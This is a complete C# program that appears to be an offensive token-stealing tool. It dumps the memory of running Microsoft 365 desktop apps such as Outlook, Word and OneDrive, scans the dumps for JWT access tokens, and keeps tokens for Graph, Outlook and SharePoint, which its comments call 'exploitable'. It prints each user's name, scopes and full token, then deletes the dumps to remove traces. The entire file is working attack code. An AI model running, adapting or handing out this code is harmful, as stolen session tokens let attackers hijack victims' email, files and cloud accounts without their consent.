using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;

class Program
{
    // To hold our token info and print out at the end 
    class TokenInfo
    {
        public string Audience { get; set; }
        public string Username { get; set; }
        public string Scope { get; set; }
        public string FullToken { get; set; }

        public TokenInfo(string audience, string username, string scope, string fullToken)
        {
            Audience = audience;
            Username = username;
            Scope = scope;
            FullToken = fullToken;
        }

        public override string ToString()
        {
            return $"[*] Username:\n\t{Username}\n[*] Audience:\n\t{Audience}\n[*] Scope:\n\t{Scope}\n[*] Token:\n{FullToken}\n";
        }
    }

    // Windows API functions and constants
    [DllImport("dbghelp.dll", SetLastError = true)]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern uint FormatMessage(uint dwFlags, IntPtr lpSource, uint dwMessageId, uint dwLanguageId, StringBuilder lpBuffer, uint nSize, IntPtr Arguments);

    const uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_VM_READ = 0x0010;
    const string DumpDirectory = "dump";

    // Our interesting processes
    static readonly string[] KnownProcesses = { "WINWORD", "ONENOTE", "POWERPNT", "OUTLOOK", "EXCEL", "ONEDRIVE", "SHAREPOINT" };

    // ... and our exploitable token audiences
    static readonly HashSet<string> KnownAudiences = new HashSet<string> { "https://graph.microsoft.com/", "https://outlook.office365.com/", "https://outlook.office.com",
                     "sharepoint.com", "00000003-0000-0000-c000-000000000000"};
    
    // Collect them all here for parsing
    static readonly HashSet<string> ExtractedTokens = new HashSet<string>();
    static readonly List<TokenInfo> ExtractedTokenInfos = new List<TokenInfo>();
    static readonly HashSet<string> AudScopeSet = new HashSet<string>();


    // let's do this!
    static void Main(string[] args)
    {
       
        Console.WriteLine("[*] Looking for M365 Desktop app processes...");

        var matchingProcesses = Process.GetProcesses()
            .Where(p => KnownProcesses.Contains(p.ProcessName.ToUpper()))
            .ToList();

        if (matchingProcesses.Count == 0)
        {
            Console.WriteLine("[-] No M365 Desktop app processes found. Exiting program.");
            return; // Exit the program
        }

        Console.WriteLine("[+] Office processes found. Starting process memory dump...");

        if (!Directory.Exists(DumpDirectory))
        {
            Console.WriteLine($"[*] Creating directory: {DumpDirectory}");
            Directory.CreateDirectory(DumpDirectory);
        }

        bool anyFilesCreated = false;
        foreach (var process in Process.GetProcesses())
        {
            try
            {
                if (KnownProcesses.Contains(process.ProcessName.ToUpper()))
                {
                    Console.WriteLine($"[*] Found target process: {process.ProcessName} (PID: {process.Id}). Proceeding with memory dump.");
                    if (DumpProcessMemory(process.Id, process.ProcessName))
                    {
                        anyFilesCreated = true;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] An error occurred while processing {process.ProcessName} (PID: {process.Id}): {ex.Message}");
            }
        }

        if (!anyFilesCreated)
        {
            Console.WriteLine("[-] No valid dump files were created. Cleaning up and exiting program.");
        }

        else
        {
            Console.WriteLine("[*] Process memory dump complete.");

            foreach (string dumpFile in Directory.EnumerateFiles(DumpDirectory, "*.dmp"))
            {
                Console.WriteLine($"[*] Trying to extract tokens from: {dumpFile}");
                ParseDumpFileForTokens(dumpFile);
            }

            Console.WriteLine("\n-------------------------Extracted Token Information:");
            foreach (var tokenInfo in ExtractedTokenInfos)
            {
                Console.WriteLine(tokenInfo);
            }
            Console.WriteLine($"\n[*] Found {ExtractedTokenInfos.Count} unique tokens with interesting audiences and permissions.");

        }
        CleanupDumpFiles();
        Console.WriteLine("[*] Done!");
    }

    static void ParseDumpFileForTokens(string filePath)
    {
        byte[] fileBytes = File.ReadAllBytes(filePath);
        var results = Regex.Matches(Encoding.UTF8.GetString(fileBytes), "eyJ0eX[a-zA-Z0-9\\._\\-]+");

        foreach (Match match in results)
        {
            if (match.Success)
            {
                string[] parts = match.Value.Split('.');
                if (parts.Length >= 2)
                {
                    string payloadEncoded = parts[1];
                    int padding = 4 - payloadEncoded.Length % 4;
                    string decodedPayload;

                    try
                    {
                        decodedPayload = Encoding.UTF8.GetString(Convert.FromBase64String(payloadEncoded + new string('=', padding)));
                        //Console.WriteLine($"[*] Decoded payload: {decodedPayload}");
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine($"[*] Error decoding payload: {ex.Message}");
                        continue;
                    }

                    try
                    {
                        JObject js = JObject.Parse(decodedPayload);
                        string aud = js["aud"]?.ToString();
                        string upn = js["upn"]?.ToString();
                        string scp = js["scp"]?.ToString();

                        // Create a unique key for audience and scope
                        string audScopeKey = $"{aud}_{scp}";
                        if (!string.IsNullOrEmpty(aud) && KnownAudiences.Contains(aud) && !AudScopeSet.Contains(audScopeKey))
                        {
                            AudScopeSet.Add(audScopeKey);
                            ExtractedTokenInfos.Add(new TokenInfo(aud, upn, scp, match.Value));
                            Console.WriteLine("[+] Token matches criteria!");
                        }
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine($"[*] Error parsing JSON: {ex.Message}");
                        continue;
                    }
                }
            }
        }
    }


    static bool DumpProcessMemory(int pid, string processName)
    {
        //Console.WriteLine($"Opening process {processName} (PID: {pid})...");
        IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine($"[-] Failed to open process {processName} (PID: {pid}).");
            DisplayLastErrorMessage();
            return false;
        }

        string dumpFilePath = Path.Combine(DumpDirectory, $"{processName}_{pid}.dmp");
        using (var fs = new FileStream(dumpFilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
        {
            Console.WriteLine($"[*] Creating dump file: {dumpFilePath}");
            if (!MiniDumpWriteDump(processHandle, pid, fs.SafeFileHandle, 2 /* MiniDumpNormal */, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine($"[-] Failed to write memory dump for process {processName} (PID: {pid}).");
                DisplayLastErrorMessage();
                return false;
            }
        }

        if (!CloseHandle(processHandle))
        {
            Console.WriteLine($"[-] Failed to close handle for process {processName} (PID: {pid}).");
            DisplayLastErrorMessage();
        }

        // Check if the dump file is empty
        if (new FileInfo(dumpFilePath).Length == 0)
        {
            Console.WriteLine($"[*] Dump file {dumpFilePath} is empty and will be deleted.");
            File.Delete(dumpFilePath);
            return false;
        }

        return true;
    }

    static void CleanupDumpFiles()
    {
        try
        {
            Console.WriteLine("[*] Cleaning up dump files...");

            // Delete all files in the DumpDirectory
            foreach (string file in Directory.GetFiles(DumpDirectory))
            {
                File.Delete(file);
            }

            // Delete the DumpDirectory
            Directory.Delete(DumpDirectory);

            Console.WriteLine("[*] Cleanup completed successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during cleanup: {ex.Message}");
        }
    }

    static void DisplayLastErrorMessage()
    {
        uint errorCode = (uint)Marshal.GetLastWin32Error();
        StringBuilder message = new StringBuilder(1024);
        FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, IntPtr.Zero, errorCode, 0, message, (uint)message.Capacity, IntPtr.Zero);

        string errorMessage = message.ToString().Replace("\r", "").Replace("\n", ""); // Stripping newlines
        Console.WriteLine($"[-] Error {errorCode}: {errorMessage}");

        if (errorMessage.Contains("Only part of a ReadProcessMemory or WriteProcessMemory request was completed"))
        {
            Console.WriteLine("[-] HINT: are your architectures matched?");
        }
    }
}
